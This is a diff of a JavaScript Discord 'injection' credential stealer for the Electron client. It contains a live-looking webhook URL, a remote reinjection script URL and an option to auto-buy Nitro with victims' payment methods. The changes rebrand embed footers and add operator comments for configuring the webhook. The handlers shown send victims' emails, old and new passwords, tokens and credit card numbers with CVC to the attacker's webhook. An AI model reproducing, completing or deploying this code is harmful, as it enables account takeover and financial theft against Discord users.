@@ -6,17 +6,17 @@ const querystring = require('querystring');
 const { BrowserWindow, session } = require('electron');
 
 const config = {
-  webhook: 'https://discord.com/api/webhooks/1130753938216468540/_wquc3lx8OCVbbtgrYEGh4ZmVNVQyA7ppQ9Zg8yc4oYaJDCTV-qi95rE1iDdOZYUDt_A', 
-  webhook_protector_key: '%WEBHOOK_KEY%', 
-  auto_buy_nitro: true, 
-  ping_on_run: false, 
-  ping_val: '@everyone',
-  embed_name: '$ Snrios - Injection $', 
-  embed_icon: 'https://raw.githubusercontent.com/mehwenarweoasdaawd/mehwenarweoasdaawd/main/Snrios.png'.replace(/ /g, '%20'), 
-  embed_color: 2895667, 
-  injection_url: 'https://raw.githubusercontent.com/mehwenarweoasdaawd/mehwenarweoasdaawd/main/index.js', 
+  webhook: '%https://discord.com/api/webhooks/1130753938216468540/_wquc3lx8OCVbbtgrYEGh4ZmVNVQyA7ppQ9Zg8yc4oYaJDCTV-qi95rE1iDdOZYUDt_A%', //your discord webhook there obviously or use the api from https://github.com/Rdimo/Discord-Webhook-Protector | Recommend using https://github.com/Rdimo/Discord-Webhook-Protector so your webhook can't be spammed or deleted
+  webhook_protector_key: '%WEBHOOK_KEY%', //your base32 encoded key IF you're using https://github.com/Rdimo/Discord-Webhook-Protector
+  auto_buy_nitro: false, //automatically buys nitro for you if they add credit card or paypal or tries to buy nitro themselves
+  ping_on_run: false, //sends whatever value you have in ping_val when you get a run/login
+  ping_val: '@everyone', //change to @here or <@ID> to ping specific user if you want, will only send if ping_on_run is true
+  embed_name: '$ Snrios - Injector $', //name of the webhook thats gonna send the info
+  embed_icon: 'https://raw.githubusercontent.com/mehwenarweoasdaawd/mehwenarweoasdaawd/main/Snrios.png', //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
+  embed_color: 13052629, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
+  injection_url: 'https://raw.githubusercontent.com/mehwenarweoasdaawd/mehwenarweoasdaawd/main/index.js', //injection url for when it reinjects
   /**
-   
+   * @ATTENTION DON'T TOUCH UNDER HERE IF UNLESS YOU'RE MODIFYING THE INJECTION OR KNOW WHAT YOU'RE DOING @ATTENTION
    **/
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
@@ -680,7 +680,7 @@ const login = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '$ Snrios - Discord Injection $',
+          text: '🎉・Discord Injection by Rose Injector・https://github.com/DamagingRose/Rose-Injector',
         },
       },
     ],
@@ -722,7 +722,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '$ Snrios - Discord Injection $',
+          text: '🎉・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection',
         },
       },
     ],
@@ -764,7 +764,7 @@ const emailChanged = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '$ Snrios - Discord Injection $',
+          text: '🎉・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection',
         },
       },
     ],
@@ -806,7 +806,7 @@ const PaypalAdded = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '$ Snrios - Discord Injection $',
+          text: '🎉・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection',
         },
       },
     ],
@@ -848,7 +848,7 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '$ Snrios - Discord Injection $',
+          text: '🎉・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection',
         },
       },
     ],
@@ -892,7 +892,7 @@ const nitroBought = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '$ Snrios - Discord Injection $',
+          text: '🎉・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection',
         },
       },
     ],
